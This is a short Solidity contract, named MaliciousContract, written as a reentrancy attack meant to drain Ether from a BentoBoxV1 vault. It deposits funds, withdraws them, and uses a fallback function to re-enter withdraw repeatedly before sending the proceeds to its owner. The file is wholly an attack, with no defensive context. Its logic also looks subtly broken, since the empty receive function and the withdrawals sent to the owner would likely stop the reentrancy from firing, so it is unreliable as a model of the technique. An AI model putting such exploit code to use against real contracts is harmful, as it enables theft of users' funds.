// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./BentoBoxV1.sol";

contract MaliciousContract {
    BentoBoxV1 public target;
    address payable public owner;

    constructor(address payable _target) public {
        target = BentoBoxV1(_target);
        owner = msg.sender;
    }

    // Fallback function to trigger reentrancy
    fallback() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(IERC20(address(0)), address(this), owner, 1 ether, 0);
        }
    }

    // Optional: receive function to accept Ether
    receive() external payable {}

    function attack(uint256 _amount) external {
        require(msg.sender == owner, "Not the owner");
        
        // Initial deposit to BentoBox
        target.deposit{value: _amount}(IERC20(address(0)), address(this), address(this), _amount, 0);
        
        // Initiate the attack
        target.withdraw(IERC20(address(0)), address(this), owner, _amount, 0);
    }

    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        owner.transfer(address(this).balance);
    }
}
